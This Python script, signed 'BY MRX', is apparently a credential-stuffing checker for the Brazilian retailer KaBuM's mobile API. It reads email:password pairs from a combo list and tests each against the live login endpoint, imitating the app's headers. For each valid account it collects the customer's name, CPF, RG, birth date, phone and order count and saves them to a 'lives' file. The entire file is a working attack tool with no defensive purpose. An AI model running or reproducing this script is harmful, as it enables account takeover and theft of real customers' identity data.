
#BY MRX
import requests
import colorama
import os
from colorama import Fore, Back, Style
colorama.init()

os.system("cls")
a = open("lista.txt", "r", encoding="utf8")

file = [s.strip() for s in a.readlines()]

for lines in file:
    combo = lines.split(':')
    h = {'Origin': 'app.kabum.com.br', 'Referer': 'app.kabum.com.br', 'Cookie': 'cors_bypass=56eb0ac8e8ec2634a3f1b9c88432327d', 'FMAPP1029384756': 'app.kabum.com.br',
         'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/3.12.0', 'Host': 'servicespub.prod.api.aws.grupokabum.com.br'}
    r = requests.post(
        'https://servicespub.prod.api.aws.grupokabum.com.br/login/v1/usuario/session', headers=h).json()
    sessid = r["session"]
    h2 = {'Origin': 'app.kabum.com.br', 'Referer': 'app.kabum.com.br', 'Cookie': 'cors_bypass=56eb0ac8e8ec2634a3f1b9c88432327d', 'FMAPP1029384756': 'app.kabum.com.br', 'Connection': 'Keep-Alive',
          'Accept-Encoding': 'gzip', 'Content-Type': 'application/json; charset=UTF-8', 'User-Agent': 'okhttp/3.12.0', 'Host': 'servicespub.prod.api.aws.grupokabum.com.br'}
    p2 = {"email": combo[0], "origem": "311",
          "senha": combo[1], "session": sessid}
    r2 = requests.post(
        'https://servicespub.prod.api.aws.grupokabum.com.br/login/v1/usuario/login', headers=h2, json=p2).json()
    decisivo = r2["valido"]
    if decisivo == False:
        print(Fore.RED + 'Email ou senha invalidos.')
    elif decisivo == True:
        idclient = r2["id_cliente"]
        r3 = requests.get(
            f'https://servicespub.prod.api.aws.grupokabum.com.br/cliente/v2/cliente?id_cliente={idclient}&session={sessid}', headers=h2).json()
        nome = r3["cliente"]["cliente_nome"]
        cpf = r3["cliente"]["cliente_cpf_cnpj"]
        rg = r3["cliente"]["cliente_rg_ie"]
        dtnascimento = r3["cliente"]["cliente_nascimento"]
        cell = r3["cliente"]["cliente_telefone_02"]
        sexo = r3["cliente"]["cliente_sexo"]
        if sexo == 'M':
            sex = 'Masculino'
        else:
            sex = 'Feminino'
        r4 = requests.get(
            f'https://servicespub.prod.api.aws.grupokabum.com.br/minhaconta/v3/pedidos?id_cliente={idclient}&session={sessid}', headers=h2).json()
        pedidos = r4["total"]
        print('')
        print(Fore.GREEN + f"LIVE(!): {combo[0]}|{combo[1]} » Nome: {nome} » Sexo: {sex} » CPF: {cpf} » RG: {rg} » Data De Nascimento: {dtnascimento} » Celular: {cell} » Pedidos: {pedidos}")
        print(Style.RESET_ALL)
        f = open("lives.txt", "a")
        f.write(f"{combo[0]}|{combo[1]} » Nome: {nome} » Sexo: {sex} » CPF: {cpf} » RG: {rg} » Data De Nascimento: {dtnascimento} » Celular: {cell} » Pedidos: {pedidos}\n\n")
        f.close()
    else:
        print(Fore.RED + 'Email ou senha invalidos.')